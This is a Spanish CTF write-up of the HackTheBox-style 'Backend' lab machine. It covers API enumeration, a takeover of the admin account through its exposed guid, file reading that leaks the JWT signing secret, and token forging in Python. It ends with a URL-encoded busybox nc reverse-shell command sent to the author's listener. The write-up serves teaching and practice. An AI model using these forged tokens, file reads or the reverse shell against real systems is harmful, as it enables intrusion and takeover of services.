# Resolución maquina Backend

**Autor:** PepeMaquina  
**Fecha:** 29 noviembre de 2025  
**Dificultad:** Medio  
**Sistema Operativo:** Linux  
**Tags:** API, FastApi, Log.

---
## Imagen de la Máquina

![](backend.jpg)

*Imagen: Backend.JPG*
## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.129.236.23 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p22,80 10.129.236.23 -oN targeted
~~~
### Enumeración de Servicios
~~~ 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    Uvicorn
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: uvicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~
Los únicos puertos abiertos son ssh y http, asi que por lo visto no se tiene otra forma de acceder.

### Enumeración API
Al intentar ingresar a la pagina web, no se ve nada creado, y al parecer todo se trata de una api que esta ejecutandose en dicho puerto.

![](backend2.jpg)

Con esta información no se puede hacer mucho, asi que se procede a enumerar los directorios.
~~~bash
feroxbuster -u http://10.129.236.23 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 0 -t 5 -o fuzz -k
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.236.23
 🚀  Threads               │ 5
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ fuzz
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ INFINITE
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       22c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        4w       29c http://10.129.236.23/
401      GET        1l        2w       30c http://10.129.236.23/docs
200      GET        1l        1w       20c http://10.129.236.23/api
~~~
Se puede ver que claramente existen dos directorios, el primero "docs" parece ser la documentación de la api, pero tiene un error 401 que indica que no se tiene acceso a ella y requiere algun tipo de autenticacion (Se intento probar con varios metodos pero ninguno bypaseo el 401).
Tambien se puede ver el directorio "api" al que si se puede ingresar, asi que viendo su contenido (Cuando se trata de apis siempre prefiero usar "curl" o burp).
~~~bash
curl 10.129.227.148/api
{"endpoints":["v1"]} 
~~~
Tal parece que existe un endpoint con "v1"
~~~bash
curl 10.129.227.148/api/v1
{"endpoints":["user","admin"]}
~~~
Al ingresar tambien se ven dos endpoint: "user" y "admin".
Al ingresar al endpoint "admin", parece que tambien requiere algun tipo de autenticacion.
~~~bash
curl -v 10.129.227.148/api/v1/admin/
*   Trying 10.129.227.148:80...
* Connected to 10.129.227.148 (10.129.227.148) port 80
* using HTTP/1.x
> GET /api/v1/admin/ HTTP/1.1
> Host: 10.129.227.148
> User-Agent: curl/8.13.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< date: Mon, 01 Dec 2025 01:09:47 GMT
< server: uvicorn
< www-authenticate: Bearer
< content-length: 30
< content-type: application/json
< 
* Connection #0 to host 10.129.227.148 left intact
{"detail":"Not authenticated"} 
~~~
Pero al ingresar a "user", parece que no encuentra algo, por alguna razon, asi que posiblemente existan mas endpoint al que se deba de ingresar pero no tenemos información sobre ello, por lo que se realizara una enumeración extra.
~~~bash
feroxbuster -u http://10.129.227.148/api/v1/user -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 0 -t 5 -o fuzz -k
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.227.148/api/v1/user
 🚀  Threads               │ 5
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ fuzz
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ INFINITE
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
422      GET        1l        6w      104c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        2w       22c http://10.129.227.148/api/v1/user
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/2006
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/12
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/11
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/10
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/2005
200      GET        1l        1w      141c http://10.129.227.148/api/v1/user/1
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/09
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/06
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/08
200      GET        1l        1w      141c http://10.129.227.148/api/v1/user/01
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/2
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/07
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/05
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/03
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/04
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/02
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/3
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/13
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/4
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/14
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/15
200      GET        1l        1w        4c http://10.129.227.148/api/v1/user/16
~~~
Por lo visto acepta todo tipo de información como endpoints, pero los que tienen una cantidad de caracteres que sobresalen son "1", "01", asi que probando esos.
~~~bash
curl 10.129.227.148/api/v1/user/1 | jq
{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "date": null,
  "time_created": 1649533388111,
  "is_superuser": true,
  "id": 1
}
~~~
Se puede ver un usuario, pero ademas del email, no se puede ver algo de valor, pero revisando a detalle se puede ver un parametro de llama la atención como "is_superuser".
Intente realizar otra vez la enumeracion de subdirectorios pero filtrando el numero de caracteres pero no encontre algo importante.

### Enumeración de directorios ocultos
Pero como se tratan de apis, puede que estas trabajen con otro tipo de metodos y asi encontrar otros endpoints, asi que realizare enumeracion con Wfuzz y filtrando codigos de estado 405 (metodo incorrecto).
~~~bash
 wfuzz -c -X POST -u http://10.129.227.148/api/v1/user/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc=405,404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.227.148/api/v1/user/FUZZ
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                    
=====================================================================

000000053:   422        0 L      3 W        172 Ch      "login"                                                                                    
000000217:   422        0 L      2 W        81 Ch       "signup" 
~~~
Se encontraron dos endpoints mas, que son buena señal, con ellos aparece un error 4022 que indica que el contenido existe pero no se procesa bien porque espera algun tipo de dato.
Revisando esto, parece que se debe esperar una espacie de autenticacion para loguearse.
~~~bash
curl -X POST 10.129.227.148/api/v1/user/login | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   172  100   172    0     0    220      0 --:--:-- --:--:-- --:--:--   220
{
  "detail": [
    {
      "loc": [
        "body",
        "username"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
~~~
Login al parecer espera un "username" y "password".
~~~bash
curl -X POST -d "username=res&password=qwr" http://10.129.227.148/api/v1/user/login | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    68  100    43  100    25     55     32 --:--:-- --:--:-- --:--:--    87
{
  "detail": "Incorrect username or password"
}
~~~
Se ingreso cualquier tipo de valor y parece que si valida las credenciales, asi que primero intentare crear un nuevo usuario con el endpoint "signup".

### Acceso con JWT
~~~bash
curl -v -X POST -d "username=test&password=123" http://10.129.227.148/api/v1/user/signup | jq
Note: Unnecessary use of -X or --request, POST is already inferred.
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.129.227.148:80...
* Connected to 10.129.227.148 (10.129.227.148) port 80
* using HTTP/1.x
> POST /api/v1/user/signup HTTP/1.1
> Host: 10.129.227.148
> User-Agent: curl/8.13.0
> Accept: */*
> Content-Length: 26
> Content-Type: application/x-www-form-urlencoded
> 
} [26 bytes data]
* upload completely sent off: 26 bytes
< HTTP/1.1 422 Unprocessable Entity
< date: Mon, 01 Dec 2025 01:36:33 GMT
< server: uvicorn
< content-length: 88
< content-type: application/json
< 
 22   114    0     0  100    26      0     40 --:--:-- --:--:-- --:--:--    40{ [88 bytes data]
100   114  100    88  100    26    113     33 --:--:-- --:--:-- --:--:--   146
* Connection #0 to host 10.129.227.148 left intact
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "value is not a valid dict",
      "type": "type_error.dict"
    }
  ]
}
~~~
Al intentar crear, parece que los datos deben enviarse en formato json. Por si las dudas, tambien es necesario agregar en los headers el content-type como json.
~~~bash
curl -X POST -d '{"username": "test", "password": "123"}' http://10.129.227.148/api/v1/user/signup -H "content-type: application/json" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   128  100    89  100    39    114     50 --:--:-- --:--:-- --:--:--   164
{
  "detail": [
    {
      "loc": [
        "body",
        "email"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
~~~
Ahora, tal parece que requiere un campo mas que es "email", pero para asegurarme, colocare todos los datos random esperando a que me diga cuales son todos los datos necesarios.
~~~bash
curl -X POST -d '{"asd": "as"}' http://10.129.227.148/api/v1/user/signup -H "content-type: application/json" | jq 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   182  100   169  100    13    217     16 --:--:-- --:--:-- --:--:--   233
{
  "detail": [
    {
      "loc": [
        "body",
        "email"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
~~~
Como se puede ver, requiere dos parametros: "email" y "password", asi que intentando con ello.
~~~bash
curl -X POST -d '{"email": "test@test.com", "password": "123"}' http://10.129.227.148/api/v1/user/signup -H "content-type: application/json" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    47  100     2  100    45      2     51  0:00:01 --:--:--  0:00:01    54
{}
~~~
No devuelve nada, asi que intentare ver si el usuario realmente esta logueado con el endpoint "login"
~~~bash
curl -X POST -d "username=test@test.com&password=123" 10.129.227.148/api/v1/user/login | jq 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   336  100   301  100    35    366     42 --:--:-- --:--:-- --:--:--   409
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzY1MjQ0NjUwLCJpYXQiOjE3NjQ1NTM0NTAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiYzY3N2Y2ODgtOWFiYy00ZjlkLWE4NTMtYzY2MzNjODBiYzhlIn0.6_qebtxOeQgFNTJkgBrA0oVAJ1YSPLzyGmEGcTRfUAg",                               
  "token_type": "bearer"
}
~~~
Hasta ahora perfecto, obtenemos un token de acceso, esto puede ser lo que se requeriria para intentar acceder a los endpoints que enviaba error 401.
Preguntando a la IA, el token corresponde a un JWT (JsonWebToken), entonces intentando ver que el contenido procedo a pegarlo en jwt.io.

![](backend3.jpg)

Si bien recordamos, el parametro "is_superuser" esta en falso, por lo tanto no somos admins, pero sabemos que existe un usuario que si lo es.
Como es in jwt, se puede agregar un header con valores del "Authorization" y agregando el jwt, esperando que ese sea el metodo de autenticación para los endpoints con error 401. 
Asi que probando esto.
~~~bash
curl http://10.129.227.148/docs -H 'Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzY1MjQ0NjUwLCJpYXQiOjE3NjQ1NTM0NTAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiYzY3N2Y2ODgtOWFiYy00ZjlkLWE4NTMtYzY2MzNjODBiYzhlIn0.6_qebtxOeQgFNTJkgBrA0oVAJ1YSPLzyGmEGcTRfUAg'     

    <!DOCTYPE html>
    <html>
    <head>
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>docs</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,

    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    </script>
    </body>
    </html>
~~~
Parece que esto si funciona, se puede ver que usa la interfaz de swagger para abrir un archivo "openapi.json", asi que siento que podria hacer dos cosas.
- Intentar agregar la cabecera para ver si se puede ver la documentacion de la api
- Descargar el archivo "openapi.json" e intentar abrirlo desde mi propia swagger
Pero la primera opción es la mas facil, asi que intentare agregarla primero a burp suite para agregar una relga donde a cualquier peticion le agrege la cabecera de jwt.
Esto se hace:
1. En burpsuite se dirige a la opcion "proxy"
2. Abrir la opcion "proxy setting"
3. Buscar "http match y replace rules" y presionar "Add"
4. Agregar el header

![](backend5.jpg)

Finalmente aceptar y todo quedara listo

![](backend4.jpg)

***NOTA: Por alguna razón, al intentar ver el contenido de "docs" en firefox se quedaba cargando dejando todo en blando, tuve que recurrir a chrome para que funcione***

Abriendo el navegador, habiliando obviamente la extension feroxbuster para interceptar con BurpSuite y dirigiendome a dicha endpoint, claramente se puede ver la documentación de todo.
De lo mas importante, se puede ver que como administrator se tiene acceso a poder ejecutar comandos, tambien se puede ver que puede leer archivos del sistema y que como usuarios normales se puede cambiar nuestra contraseña.

### Impersonando usuario "admin"
Como todo parece ser posible solamente siendo admins, no hay mucho que se pueda hacer, posiblemente sea cosa del parametro "is_superuser" en el jwt, asi que intentare cambiar la contraseña de usuario admin, siempre y cuando no este bien configurado se podra hacerlo.

![](backend7.jpg)

Esto pide el guid y la contraseña, si bien recordamos, en la ruta "/api/v1/user/1" se podia ver el guid del usuario admin.
~~~bash
curl http://10.129.227.148/api/v1/user/1 | jq                                              
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   141  100   141    0     0    181      0 --:--:-- --:--:-- --:--:--   181
{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "date": null,
  "time_created": 1649533388111,
  "is_superuser": true,
  "id": 1
}
~~~
Asi que colocando eso y executamos, al parecer si funciono.
Intentando corroborar, tal parece que ya se tiene acceso como admins.
~~~bash
curl -X POST -d "username=admin@htb.local&password=penelope" 10.129.227.148/api/v1/user/login | jq 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   342  100   300  100    42    362     50 --:--:-- --:--:-- --:--:--   414
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzY1MjQ3MzkwLCJpYXQiOjE3NjQ1NTYxOTAsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.aRa-aEnIyISMPHovKK_2Bq1PnHjv-t1-b32xys5zwlQ",                                
  "token_type": "bearer"
}
~~~
Ahora revisando que permisos tiene con jwt.io.

![](backend8.jpg)

Efectivamente ahora tenemos el jwt de admin, con el parametro "is_superuser" en true, asi que cambiando el jwt en el header con burp suite como se explico anteriormente, se intentara executar comandos con el endpoint "/api/v1/admin/exec/{command}" que se vio anteriormente. 

![](backend9.jpg)

Esto no es posible, porque al parecer existe otro parametro "Debug" en el jwt que deberia estar en "true", pero por lo visto no existe en ninguna parte de los jwt que obtuvimos.
Pero en teoria, como es jwt, este presenta una "masterkey", a la cual si obtenemos acceso se podria agregar, quitar y modificar parametros a voluntad (mi teoria dice que va por ese lado, o talvez como tenemos un LFI simplemente se podra obtener alguna contraseña y leerla).

### Creacion JWT con nuevos parametros
Entonces viendo el LFI, lo primero que hago casi siempre es ver las variables de entorno, para saber en que contexto me encuentro.

![](backend10.jpg)

Realizando la peticion por la web, se obtiene eso.
~~~bash
{
  "file": "APP_MODULE=app.main:app\u0000PWD=/home/htb/uhc\u0000LOGNAME=htb\u0000PORT=80\u0000HOME=/home/htb\u0000LANG=C.UTF-8\u0000VIRTUAL_ENV=/home/htb/uhc/.venv\u0000INVOCATION_ID=9bdbe25731c64c14b18e2290ca5d2bf5\u0000HOST=0.0.0.0\u0000USER=htb\u0000SHLVL=0\u0000PS1=(.venv) \u0000JOURNAL_STREAM=9:18748\u0000PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000OLDPWD=/\u0000"
}
~~~
Basicamente nos dice que el usuario que la corre es "htb", la aplicacion que corre muy probablemente este construida en python, y una posible dirección que es "app/main.py", tambien muestra la direccion actual de trabajo "/home/htb/uhc", asi que todo parece atentar a que la aplicacion corre en la direccion "/home/htb/uhc/app/main.py".

***NOTA: Primeramente intente ver si tenia la calve rsa en "/home/htb/.ssh/id_rsa" y no la encontre, asi que intentare ver credenciales en algun archivo de configuracion o encontrar una base de datos***

Para mas comodidad al escribir el writeup, voy a hacer la consulta por curl y no pegar mas imagenes.
~~~bash
curl -X 'POST' 'http://10.129.227.148/api/v1/admin/file' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"file": "/home/htb/uhc/app/main.py"}' -H 'Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzY1MjQ3MzkwLCJpYXQiOjE3NjQ1NTYxOTAsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.aRa-aEnIyISMPHovKK_2Bq1PnHjv-t1-b32xys5zwlQ'

{"file":"import asyncio\n\nfrom fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends\nfrom fastapi_contrib.common.responses import UJSONResponse\nfrom fastapi import FastAPI, Depends, HTTPException, status\nfrom fastapi.security import HTTPBasic, HTTPBasicCredentials\nfrom fastapi.openapi.docs import get_swagger_ui_html\nfrom fastapi.openapi.utils import get_openapi\n\n\n\nfrom typing import Optional, Any\nfrom pathlib import Path\nfrom sqlalchemy.orm import Session\n\n\n\nfrom app.schemas.user import User\nfrom app.api.v1.api import api_router\nfrom app.core.config import settings\n\nfrom app import deps\nfrom app import crud\n\n\napp = FastAPI(title=\"UHC API Quals\", openapi_url=None, docs_url=None, redoc_url=None)\nroot_router = APIRouter(default_response_class=UJSONResponse)\n\n\n@app.get(\"/\", status_code=200)\ndef root():\n    \"\"\"\n    Root GET\n    \"\"\"\n    return {\"msg\": \"UHC API Version 1.0\"}\n\n\n@app.get(\"/api\", status_code=200)\ndef list_versions():\n    \"\"\"\n    Versions\n    \"\"\"\n    return {\"endpoints\":[\"v1\"]}\n\n\n@app.get(\"/api/v1\", status_code=200)\ndef list_endpoints_v1():\n    \"\"\"\n    Version 1 Endpoints\n    \"\"\"\n    return {\"endpoints\":[\"user\", \"admin\"]}\n\n\n@app.get(\"/docs\")\nasync def get_documentation(\n    current_user: User = Depends(deps.parse_token)\n    ):\n    return get_swagger_ui_html(openapi_url=\"/openapi.json\", title=\"docs\")\n\n@app.get(\"/openapi.json\")\nasync def openapi(\n    current_user: User = Depends(deps.parse_token)\n):\n    return get_openapi(title = \"FastAPI\", version=\"0.1.0\", routes=app.routes)\n\napp.include_router(api_router, prefix=settings.API_V1_STR)\napp.include_router(root_router)\n\ndef start():\n    import uvicorn\n\n    uvicorn.run(app, host=\"0.0.0.0\", port=8001, log_level=\"debug\")\n\nif __name__ == \"__main__\":\n    # Use this for debugging purposes only\n    import uvicorn\n\n    uvicorn.run(app, host=\"0.0.0.0\", port=8001, log_level=\"debug\")\n"} 
~~~
La ubicacion del main.py fue correcta, con esto se puede ver la estructura que sigue la aplicación, posiblemente se podria leer y encontrar alguna vulnerabilidad pero lo que me interesa es encontrar algun archivo de configuracion que posiblemente tenga credenciales.
Revisando el archivo, lo que llama mi atencion es "import api_router\nfrom app.core.config", esto da a indicar que existe la ruta "app/core/config.py" que es un archivo de configuracion.
~~~bash
curl -X 'POST' 'http://10.129.227.148/api/v1/admin/file' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"file": "/home/htb/uhc/app/core/config.py"}' -H 'Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzY1MjQ3MzkwLCJpYXQiOjE3NjQ1NTYxOTAsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.aRa-aEnIyISMPHovKK_2Bq1PnHjv-t1-b32xys5zwlQ'

{"file":"from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator\nfrom typing import List, Optional, Union\n\nfrom enum import Enum\n\n\nclass Settings(BaseSettings):\n    API_V1_STR: str = \"/api/v1\"\n    JWT_SECRET: str = \"SuperSecretSigningKey-HTB\"\n    ALGORITHM: str = \"HS256\"\n\n    # 60 minutes * 24 hours * 8 days = 8 days\n    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8\n\n    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins\n    # e.g: '[\"http://localhost\", \"http://localhost:4200\", \"http://localhost:3000\", \\\n    # \"http://localhost:8080\", \"http://local.dockertoolbox.tiangolo.com\"]'\n    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []\n\n    @validator(\"BACKEND_CORS_ORIGINS\", pre=True)\n    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:\n        if isinstance(v, str) and not v.startswith(\"[\"):\n            return [i.strip() for i in v.split(\",\")]\n        elif isinstance(v, (list, str)):\n            return v\n        raise ValueError(v)\n\n    SQLALCHEMY_DATABASE_URI: Optional[str] = \"sqlite:///uhc.db\"\n    FIRST_SUPERUSER: EmailStr = \"root@ippsec.rocks\"    \n\n    class Config:\n        case_sensitive = True\n \n\nsettings = Settings()\n"} 
~~~
Efectivamente funciona, si se quiere una mejor vista se podria utilizar modificadores en la terminal o mas facil pedirle a la IA que lo haga.
En el archivo de configuracion no se encuentran credenciales, pero se puede encontrar la masterkey de JWT "SuperSecretSigningKey-HTB", asi que primero intentare modificar el JWT de mi usuario creado "test" y agregare los parametros "debug" y "is_superuser" como true, para no interferir con el JWT original de "admin"
Yo no se como hacerlo, pero buscando en internet el mejor metodo es usar python.
~~~bash
┌──(kali㉿kali)-[~/htb/backend/nmap]
└─$ python3
Python 3.13.2 (main, Mar 13 2025, 14:29:07) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> secret = "SuperSecretSigningKey-HTB"
>>> token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzY1MjY4MDMwLCJpYXQiOjE3NjQ1NzY4MzAsInN1YiI6IjIiLCJpc19zdXBlcnVzZ\
XIiOmZhbHNlLCJndWlkIjoiYzY3N2Y2ODgtOWFiYy00ZjlkLWE4NTMtYzY2MzNjODBiYzhlIn0.rc7OFrOUQPAhHv4xpriFZYnu_ht7AcHDVuM3AAuKi8k"
>>> decoded_payload = jwt.decode(token, secret, algorithms=["HS256"], options={"verify_signature": False})
>>> decoded_payload["is_superuser"] = True
>>> decoded_payload["debug"] = True
>>> new_token = jwt.encode(decoded_payload, secret, algorithm="HS256")
>>> print(f"Nuevo JWT: {new_token}")
Nuevo JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzY1MjY4MDMwLCJpYXQiOjE3NjQ1NzY4MzAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiJjNjc3ZjY4OC05YWJjLTRmOWQtYTg1My1jNjYzM2M4MGJjOGUiLCJkZWJ1ZyI6dHJ1ZX0.MWPyfYpdGUfwBU7zixuAylvLAohi4UCcNBpiV473guY
>>> 
~~~
Viendo el contenido del nuevo JWT.

![](backend11.jpg)

Se puede ver que ahora si tiene el parametro "debug" en true, por lo que esto deberia funcionar para poder ejecutar comandos, asi que lo probare.
***NOTA: No olvidarse de colocar el nuevo token en la regla de burpsuite***

![](backend12.jpg)

Se ve que ahora si funciona la ejecucion remota de comandos.

### Ejecución de reverse shell valida
Ahora pensando en lanzar una reverse shell, no podria anotar ningun comando que tenga el simbolo "/", asi que simplemente usare la busybox pero con algunos parametros encondeados URL, y la realizare por curl ya que la web lo puede tomar los % directamente como simbolo.
~~~bash
curl -X 'GET' -H 'accept: application/json' -H 'Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzY1MjY4MDMwLCJpYXQiOjE3NjQ1NzY4MzAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiJjNjc3ZjY4OC05YWJjLTRmOWQtYTg1My1jNjYzM2M4MGJjOGUiLCJkZWJ1ZyI6dHJ1ZX0.MWPyfYpdGUfwBU7zixuAylvLAohi4UCcNBpiV473guY' 'http://10.129.227.148/api/v1/admin/exec/busybox%20nc%2010.10.17.28%204433%20-e%20bash'
~~~
En otro puerto abri un escucha, logrando asi conectarme exitosamente como el usuario "htb".
***NOTA: Ultimamente se hizo tendencia una herramienta (penelope) que realiza la sanitización TTY automaticamente, asi que como no quiero quedarme atras (y porque me da flojera sanitizar), no cuesta nada probarla***
~~~bash
penelope -p 4433
[+] Listening for reverse shells on 0.0.0.0:4433 →  127.0.0.1 • 192.168.5.128 • 172.17.0.1 • 10.10.17.28
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from backend~10.129.227.148-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /home/htb/uhc/.venv/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/backend~10.129.227.148-Linux-x86_64/2025_11_30-23_14_08-071.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
